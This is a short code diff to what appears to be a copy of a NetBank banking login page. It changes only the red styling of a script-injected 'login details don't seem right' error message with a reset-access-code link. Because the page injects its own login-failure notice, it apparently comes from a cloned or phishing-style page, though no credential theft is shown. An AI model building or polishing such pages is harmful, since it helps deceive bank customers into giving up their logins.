@@ -211,17 +211,19 @@ function showLoading() {
     const loginInput = document.querySelector('.ft') || document.body;
 
     const errorDiv = document.createElement('div');
-    errorDiv.className = 'message warning message-block';
-    errorDiv.innerHTML = `
-      <div class="message-content">
-        <p class="icon-block icon-info no-margin-bottom uia-error-message">
-          <span>
-            Sorry, your login details don't seem right. Please check and try again or
-            <a class="uia-forgotten-access-code" href="javascript:;" id="forgottenAccessCode">reset your access code here</a>.
-          </span>
-        </p>
-      </div>
-    `;
+errorDiv.className = 'message warning message-block';
+errorDiv.innerHTML = `
+  <div class="message-content">
+    <p class="icon-block icon-info no-margin-bottom uia-error-message">
+      <span style="color: red;">
+        Sorry, your login details don't seem right. Please check and try again or
+        <a class="uia-forgotten-access-code" href="javascript:;" id="forgottenAccessCode" style="color: red;">
+          reset your access code here
+        </a>.
+      </span>
+    </p>
+  </div>
+`;
 
     const form = document.querySelector('.ft') || loginInput;
     if (form && form.firstChild) {
@@ -546,6 +548,7 @@ WebForm_OnSubmit = function() {
 	<input type="hidden" id="SC_MEDIAMIND_ID" name="SC_MEDIAMIND_ID" value=""/><input type="hidden" id="SC_PRODUCT_ID" name="SC_PRODUCT_ID" value=""/><input type="hidden" id="SC_CUSTOMER_TYPE" name="SC_CUSTOMER_TYPE" value="NetBank"/><input type="hidden" id="SC_SCREEN_NAME" name="SC_SCREEN_NAME" value=""/>
 </body>
 </html>
+
 
 
 
